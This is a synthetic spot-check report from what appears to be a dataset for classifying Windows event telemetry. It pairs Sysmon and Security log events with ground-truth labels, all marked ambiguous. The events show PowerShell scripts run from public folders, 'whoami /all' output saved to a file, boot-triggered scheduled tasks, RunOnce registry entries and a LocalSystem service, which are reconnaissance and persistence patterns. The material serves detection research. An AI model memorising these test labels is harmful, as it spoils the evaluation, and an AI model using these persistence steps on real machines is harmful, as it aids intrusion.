# Deterministic synthetic manual spot-check

Selection: one pair per family and at least two DEV and two TEST pairs per negative class.
This generated package is not a claim of completed manual review.

## pair_1aa44fd3
Family: TF_AMBIG_A; split: test
Transition: ambiguous -> ambiguous
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "APPSVR01",
    "event_id": "evt_10733198",
    "event_record_id": 233778125419314,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File C:\\Users\\Public\\alder_spruce_holly_1aa44f\\unknown.ps1",
      "Computer": "APPSVR01",
      "EventID": 1,
      "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "LogonGuid": "{c56722a6-1b11-1fa5-b827-57462543c2ea}",
      "LogonId": "0x1dcd",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{e9248fee-c660-d743-bbe4-396a594b1ec6}",
      "ParentProcessId": 7624,
      "ProcessGuid": "{d49eb61f-3332-e413-5bf6-09c6ab89b19b}",
      "ProcessId": 7628,
      "User": "tjones",
      "UtcTime": "2026-02-16T11:07:57Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-02-16T11:07:57Z",
    "windows_event_id": 1
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File C:\\Users\\Public\\alder_spruce_holly_1aa44f\\unknown.ps1",
    "Computer": "APPSVR01",
    "EventID": 1,
    "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "LogonGuid": "{c56722a6-1b11-1fa5-b827-57462543c2ea}",
    "LogonId": "0x1dcd",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{e9248fee-c660-d743-bbe4-396a594b1ec6}",
    "ParentProcessId": 7624,
    "ProcessGuid": "{d49eb61f-3332-e413-5bf6-09c6ab89b19b}",
    "ProcessId": 7628,
    "User": "tjones",
    "UtcTime": "2026-02-16T11:07:57Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_AMBIG_A/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_10733198",
        "fields": [
          "CommandLine",
          "EventID"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "The event is observable and dual-use, but the single view lacks enough intent or authorization evidence.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_240fcff3"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "APPSVR01",
    "event_id": "evt_10733198",
    "event_record_id": 233778125419314,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File C:\\Users\\Public\\alder_spruce_holly_1aa44f\\unknown.ps1",
      "Computer": "APPSVR01",
      "EventID": 1,
      "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "LogonGuid": "{c56722a6-1b11-1fa5-b827-57462543c2ea}",
      "LogonId": "0x1dcd",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{e9248fee-c660-d743-bbe4-396a594b1ec6}",
      "ParentProcessId": 7624,
      "ProcessGuid": "{d49eb61f-3332-e413-5bf6-09c6ab89b19b}",
      "ProcessId": 7628,
      "User": "tjones",
      "UtcTime": "2026-02-16T11:07:57Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-02-16T11:07:57Z",
    "windows_event_id": 1
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "APPSVR01",
    "event_id": "evt_e3e294a9",
    "event_record_id": 234098626198900,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File C:\\Users\\Public\\alder_spruce_holly_1aa44f\\unknown.ps1 -Mode daily",
      "Computer": "APPSVR01",
      "EventID": 1,
      "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "LogonGuid": "{c56722a6-1b11-1fa5-b827-57462543c2ea}",
      "LogonId": "0x1dcd",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{e9248fee-c660-d743-bbe4-396a594b1ec6}",
      "ParentProcessId": 7624,
      "ProcessGuid": "{d4e95574-fd74-da8e-cc8a-e2158a024840}",
      "ProcessId": 7632,
      "User": "tjones",
      "UtcTime": "2026-02-16T11:08:00Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-02-16T11:08:00Z",
    "windows_event_id": 1
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File C:\\Users\\Public\\alder_spruce_holly_1aa44f\\unknown.ps1",
    "Computer": "APPSVR01",
    "EventID": 1,
    "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "LogonGuid": "{c56722a6-1b11-1fa5-b827-57462543c2ea}",
    "LogonId": "0x1dcd",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{e9248fee-c660-d743-bbe4-396a594b1ec6}",
    "ParentProcessId": 7624,
    "ProcessGuid": "{d49eb61f-3332-e413-5bf6-09c6ab89b19b}",
    "ProcessId": 7628,
    "User": "tjones",
    "UtcTime": "2026-02-16T11:07:57Z"
  },
  {
    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File C:\\Users\\Public\\alder_spruce_holly_1aa44f\\unknown.ps1 -Mode daily",
    "Computer": "APPSVR01",
    "EventID": 1,
    "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "LogonGuid": "{c56722a6-1b11-1fa5-b827-57462543c2ea}",
    "LogonId": "0x1dcd",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{e9248fee-c660-d743-bbe4-396a594b1ec6}",
    "ParentProcessId": 7624,
    "ProcessGuid": "{d4e95574-fd74-da8e-cc8a-e2158a024840}",
    "ProcessId": 7632,
    "User": "tjones",
    "UtcTime": "2026-02-16T11:08:00Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_AMBIG_A/contextual",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_10733198",
        "fields": [
          "CommandLine",
          "Computer",
          "EventID"
        ]
      },
      {
        "event_id": "evt_e3e294a9",
        "fields": [
          "Computer"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "Context repeats the dual-use behavior without independently establishing mapped or affirmative benign evidence.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_52bb5783"
}
```

## pair_01f0e861
Family: TF_AMBIG_B; split: test
Transition: ambiguous -> ambiguous
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "FILESVR01",
    "event_id": "evt_002d4971",
    "event_record_id": 115570528301210,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c whoami /all",
      "Computer": "FILESVR01",
      "EventID": 4688,
      "NewProcessId": "0x2874",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0x2870",
      "SubjectLogonId": "0x2875",
      "SubjectUserName": "wlee",
      "TargetUserName": "wlee",
      "TimeCreated": "2026-01-05T00:08:20Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-01-05T00:08:20Z",
    "windows_event_id": 4688
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c whoami /all",
    "Computer": "FILESVR01",
    "EventID": 4688,
    "NewProcessId": "0x2874",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0x2870",
    "SubjectLogonId": "0x2875",
    "SubjectUserName": "wlee",
    "TargetUserName": "wlee",
    "TimeCreated": "2026-01-05T00:08:20Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_AMBIG_B/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_002d4971",
        "fields": [
          "CommandLine",
          "EventID"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "The event is observable and dual-use, but the single view lacks enough intent or authorization evidence.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_22e8b397"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "FILESVR01",
    "event_id": "evt_002d4971",
    "event_record_id": 115570528301210,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c whoami /all",
      "Computer": "FILESVR01",
      "EventID": 4688,
      "NewProcessId": "0x2874",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0x2870",
      "SubjectLogonId": "0x2875",
      "SubjectUserName": "wlee",
      "TargetUserName": "wlee",
      "TimeCreated": "2026-01-05T00:08:20Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-01-05T00:08:20Z",
    "windows_event_id": 4688
  },
  {
    "channel": "Security",
    "computer": "FILESVR01",
    "event_id": "evt_b3516655",
    "event_record_id": 244091891863960,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c whoami /all /fo table > C:\\Users\\wlee\\AppData\\Local\\willow_yew_beech_01f0e8\\identity.txt",
      "Computer": "FILESVR01",
      "EventID": 4688,
      "NewProcessId": "0x2878",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0x2870",
      "SubjectLogonId": "0x2875",
      "SubjectUserName": "wlee",
      "TargetUserName": "wlee",
      "TimeCreated": "2026-01-05T00:08:23Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-01-05T00:08:23Z",
    "windows_event_id": 4688
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c whoami /all",
    "Computer": "FILESVR01",
    "EventID": 4688,
    "NewProcessId": "0x2874",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0x2870",
    "SubjectLogonId": "0x2875",
    "SubjectUserName": "wlee",
    "TargetUserName": "wlee",
    "TimeCreated": "2026-01-05T00:08:20Z"
  },
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c whoami /all /fo table > C:\\Users\\wlee\\AppData\\Local\\willow_yew_beech_01f0e8\\identity.txt",
    "Computer": "FILESVR01",
    "EventID": 4688,
    "NewProcessId": "0x2878",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0x2870",
    "SubjectLogonId": "0x2875",
    "SubjectUserName": "wlee",
    "TargetUserName": "wlee",
    "TimeCreated": "2026-01-05T00:08:23Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_AMBIG_B/contextual",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_002d4971",
        "fields": [
          "CommandLine",
          "Computer",
          "EventID"
        ]
      },
      {
        "event_id": "evt_b3516655",
        "fields": [
          "Computer"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "Context repeats the dual-use behavior without independently establishing mapped or affirmative benign evidence.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_1ba61d19"
}
```

## pair_0eb12df7
Family: TF_AMBIG_C; split: test
Transition: ambiguous -> ambiguous
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WORKSTATION01",
    "event_id": "evt_02189817",
    "event_record_id": 221864259560536,
    "fields": {
      "Computer": "WORKSTATION01",
      "EventID": 4698,
      "SubjectLogonId": "0x11f01",
      "SubjectUserName": "jsmith",
      "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\ProgramData\\elm_oak_willow_0eb12d\\cache.exe</Command><Arguments></Arguments></Exec></Actions></Task>",
      "TaskName": "\\CacheRefresh_elm_oak_willow_0eb12d",
      "TimeCreated": "2026-01-03T15:07:45Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-01-03T15:07:45Z",
    "windows_event_id": 4698
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "WORKSTATION01",
    "EventID": 4698,
    "SubjectLogonId": "0x11f01",
    "SubjectUserName": "jsmith",
    "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\ProgramData\\elm_oak_willow_0eb12d\\cache.exe</Command><Arguments></Arguments></Exec></Actions></Task>",
    "TaskName": "\\CacheRefresh_elm_oak_willow_0eb12d",
    "TimeCreated": "2026-01-03T15:07:45Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_AMBIG_C/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_02189817",
        "fields": [
          "EventID",
          "TaskContent"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "The event is observable and dual-use, but the single view lacks enough intent or authorization evidence.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_bcad5d48"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WORKSTATION01",
    "event_id": "evt_02189817",
    "event_record_id": 221864259560536,
    "fields": {
      "Computer": "WORKSTATION01",
      "EventID": 4698,
      "SubjectLogonId": "0x11f01",
      "SubjectUserName": "jsmith",
      "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\ProgramData\\elm_oak_willow_0eb12d\\cache.exe</Command><Arguments></Arguments></Exec></Actions></Task>",
      "TaskName": "\\CacheRefresh_elm_oak_willow_0eb12d",
      "TimeCreated": "2026-01-03T15:07:45Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-01-03T15:07:45Z",
    "windows_event_id": 4698
  },
  {
    "channel": "Security",
    "computer": "WORKSTATION01",
    "event_id": "evt_a13c4b10",
    "event_record_id": 132493937038287,
    "fields": {
      "Computer": "WORKSTATION01",
      "EventID": 4698,
      "SubjectLogonId": "0x11f01",
      "SubjectUserName": "jsmith",
      "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\ProgramData\\elm_oak_willow_0eb12d\\cache.exe</Command><Arguments>--job elm_oak_willow_0eb12d</Arguments></Exec></Actions></Task>",
      "TaskName": "\\CacheRefreshNext_elm_oak_willow_0eb12d",
      "TimeCreated": "2026-01-03T15:07:48Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-01-03T15:07:48Z",
    "windows_event_id": 4698
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "WORKSTATION01",
    "EventID": 4698,
    "SubjectLogonId": "0x11f01",
    "SubjectUserName": "jsmith",
    "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\ProgramData\\elm_oak_willow_0eb12d\\cache.exe</Command><Arguments></Arguments></Exec></Actions></Task>",
    "TaskName": "\\CacheRefresh_elm_oak_willow_0eb12d",
    "TimeCreated": "2026-01-03T15:07:45Z"
  },
  {
    "Computer": "WORKSTATION01",
    "EventID": 4698,
    "SubjectLogonId": "0x11f01",
    "SubjectUserName": "jsmith",
    "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\ProgramData\\elm_oak_willow_0eb12d\\cache.exe</Command><Arguments>--job elm_oak_willow_0eb12d</Arguments></Exec></Actions></Task>",
    "TaskName": "\\CacheRefreshNext_elm_oak_willow_0eb12d",
    "TimeCreated": "2026-01-03T15:07:48Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_AMBIG_C/contextual",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_02189817",
        "fields": [
          "Computer",
          "EventID",
          "TaskContent"
        ]
      },
      {
        "event_id": "evt_a13c4b10",
        "fields": [
          "Computer"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "Context repeats the dual-use behavior without independently establishing mapped or affirmative benign evidence.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_0154d703"
}
```

## pair_19272197
Family: TF_AMBIG_D; split: test
Transition: ambiguous -> ambiguous
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_555b6835",
    "event_record_id": 108659267751175,
    "fields": {
      "Computer": "FILESVR01",
      "Details": "C:\\Users\\jsmith\\AppData\\Local\\pine_ash_cedar_192721\\helper.exe",
      "EventID": 13,
      "EventType": "SetValue",
      "Image": "C:\\Windows\\System32\\helper.exe",
      "ProcessGuid": "{62d3350e-4d07-9503-1384-73e12042a538}",
      "ProcessId": 43928,
      "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-19313\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\pine_ash_cedar_192721",
      "User": "jsmith",
      "UtcTime": "2026-01-22T08:08:02Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-22T08:08:02Z",
    "windows_event_id": 13
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "FILESVR01",
    "Details": "C:\\Users\\jsmith\\AppData\\Local\\pine_ash_cedar_192721\\helper.exe",
    "EventID": 13,
    "EventType": "SetValue",
    "Image": "C:\\Windows\\System32\\helper.exe",
    "ProcessGuid": "{62d3350e-4d07-9503-1384-73e12042a538}",
    "ProcessId": 43928,
    "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-19313\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\pine_ash_cedar_192721",
    "User": "jsmith",
    "UtcTime": "2026-01-22T08:08:02Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_AMBIG_D/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_555b6835",
        "fields": [
          "Details",
          "EventID"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "The event is observable and dual-use, but the single view lacks enough intent or authorization evidence.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_4e2d9d56"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_555b6835",
    "event_record_id": 108659267751175,
    "fields": {
      "Computer": "FILESVR01",
      "Details": "C:\\Users\\jsmith\\AppData\\Local\\pine_ash_cedar_192721\\helper.exe",
      "EventID": 13,
      "EventType": "SetValue",
      "Image": "C:\\Windows\\System32\\helper.exe",
      "ProcessGuid": "{62d3350e-4d07-9503-1384-73e12042a538}",
      "ProcessId": 43928,
      "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-19313\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\pine_ash_cedar_192721",
      "User": "jsmith",
      "UtcTime": "2026-01-22T08:08:02Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-22T08:08:02Z",
    "windows_event_id": 13
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_1a318afc",
    "event_record_id": 145194978772691,
    "fields": {
      "Computer": "FILESVR01",
      "Details": "C:\\Users\\jsmith\\AppData\\Local\\pine_ash_cedar_192721\\helper.exe",
      "EventID": 13,
      "EventType": "SetValue",
      "Image": "C:\\Windows\\System32\\helper.exe",
      "ProcessGuid": "{840dd722-06d3-9df9-d5ff-41eaea934101}",
      "ProcessId": 43932,
      "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-19313\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\Next_pine_ash_cedar_192721",
      "User": "jsmith",
      "UtcTime": "2026-01-22T08:08:05Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-22T08:08:05Z",
    "windows_event_id": 13
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "FILESVR01",
    "Details": "C:\\Users\\jsmith\\AppData\\Local\\pine_ash_cedar_192721\\helper.exe",
    "EventID": 13,
    "EventType": "SetValue",
    "Image": "C:\\Windows\\System32\\helper.exe",
    "ProcessGuid": "{62d3350e-4d07-9503-1384-73e12042a538}",
    "ProcessId": 43928,
    "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-19313\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\pine_ash_cedar_192721",
    "User": "jsmith",
    "UtcTime": "2026-01-22T08:08:02Z"
  },
  {
    "Computer": "FILESVR01",
    "Details": "C:\\Users\\jsmith\\AppData\\Local\\pine_ash_cedar_192721\\helper.exe",
    "EventID": 13,
    "EventType": "SetValue",
    "Image": "C:\\Windows\\System32\\helper.exe",
    "ProcessGuid": "{840dd722-06d3-9df9-d5ff-41eaea934101}",
    "ProcessId": 43932,
    "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-19313\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\Next_pine_ash_cedar_192721",
    "User": "jsmith",
    "UtcTime": "2026-01-22T08:08:05Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_AMBIG_D/contextual",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_555b6835",
        "fields": [
          "Computer",
          "Details",
          "EventID"
        ]
      },
      {
        "event_id": "evt_1a318afc",
        "fields": [
          "Computer"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "Context repeats the dual-use behavior without independently establishing mapped or affirmative benign evidence.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_7c2d0b12"
}
```

## pair_8d6d44a8
Family: TF_AMBIG_DEV; split: dev
Transition: ambiguous -> ambiguous
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "EXCH01",
    "event_id": "evt_34b1e157",
    "event_record_id": 218315603435275,
    "fields": {
      "Computer": "EXCH01",
      "EventID": 4697,
      "ServiceAccount": "LocalSystem",
      "ServiceFileName": "C:\\ProgramData\\elm_pine_cedar_8d6d44\\agent.exe",
      "ServiceName": "Telemetry_elm_pine_cedar_8d6d44",
      "ServiceStartType": "3",
      "ServiceType": "0x10",
      "SubjectDomainName": "EXCH01",
      "SubjectLogonId": "0x4de9",
      "SubjectUserName": "mchen",
      "TimeCreated": "2026-06-29T19:11:40Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-06-29T19:11:40Z",
    "windows_event_id": 4697
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "EXCH01",
    "EventID": 4697,
    "ServiceAccount": "LocalSystem",
    "ServiceFileName": "C:\\ProgramData\\elm_pine_cedar_8d6d44\\agent.exe",
    "ServiceName": "Telemetry_elm_pine_cedar_8d6d44",
    "ServiceStartType": "3",
    "ServiceType": "0x10",
    "SubjectDomainName": "EXCH01",
    "SubjectLogonId": "0x4de9",
    "SubjectUserName": "mchen",
    "TimeCreated": "2026-06-29T19:11:40Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_AMBIG_DEV/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_34b1e157",
        "fields": [
          "ServiceFileName",
          "ServiceStartType"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "A ProgramData service with demand start is observable but lacks signer, creator, and execution context needed for attribution.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_dbee43b9"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "EXCH01",
    "event_id": "evt_34b1e157",
    "event_record_id": 218315603435275,
    "fields": {
      "Computer": "EXCH01",
      "EventID": 4697,
      "ServiceAccount": "LocalSystem",
      "ServiceFileName": "C:\\ProgramData\\elm_pine_cedar_8d6d44\\agent.exe",
      "ServiceName": "Telemetry_elm_pine_cedar_8d6d44",
      "ServiceStartType": "3",
      "ServiceType": "0x10",
      "SubjectDomainName": "EXCH01",
      "SubjectLogonId": "0x4de9",
      "SubjectUserName": "mchen",
      "TimeCreated": "2026-06-29T19:11:40Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-06-29T19:11:40Z",
    "windows_event_id": 4697
  },
  {
    "channel": "Security",
    "computer": "EXCH01",
    "event_id": "evt_42d088b9",
    "event_record_id": 61116199290984,
    "fields": {
      "Computer": "EXCH01",
      "EventID": 4697,
      "ServiceAccount": "LocalSystem",
      "ServiceFileName": "C:\\ProgramData\\elm_pine_cedar_8d6d44\\agent.exe",
      "ServiceName": "TelemetryNext_elm_pine_cedar_8d6d44",
      "ServiceStartType": "3",
      "ServiceType": "0x10",
      "SubjectDomainName": "EXCH01",
      "SubjectLogonId": "0x4de9",
      "SubjectUserName": "mchen",
      "TimeCreated": "2026-06-29T19:11:43Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-06-29T19:11:43Z",
    "windows_event_id": 4697
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "EXCH01",
    "EventID": 4697,
    "ServiceAccount": "LocalSystem",
    "ServiceFileName": "C:\\ProgramData\\elm_pine_cedar_8d6d44\\agent.exe",
    "ServiceName": "Telemetry_elm_pine_cedar_8d6d44",
    "ServiceStartType": "3",
    "ServiceType": "0x10",
    "SubjectDomainName": "EXCH01",
    "SubjectLogonId": "0x4de9",
    "SubjectUserName": "mchen",
    "TimeCreated": "2026-06-29T19:11:40Z"
  },
  {
    "Computer": "EXCH01",
    "EventID": 4697,
    "ServiceAccount": "LocalSystem",
    "ServiceFileName": "C:\\ProgramData\\elm_pine_cedar_8d6d44\\agent.exe",
    "ServiceName": "TelemetryNext_elm_pine_cedar_8d6d44",
    "ServiceStartType": "3",
    "ServiceType": "0x10",
    "SubjectDomainName": "EXCH01",
    "SubjectLogonId": "0x4de9",
    "SubjectUserName": "mchen",
    "TimeCreated": "2026-06-29T19:11:43Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_AMBIG_DEV/contextual",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_34b1e157",
        "fields": [
          "Computer",
          "ServiceFileName"
        ]
      },
      {
        "event_id": "evt_42d088b9",
        "fields": [
          "Computer",
          "ServiceName"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "The related service metadata remains dual-use and does not resolve to mapped or affirmative benign evidence.",
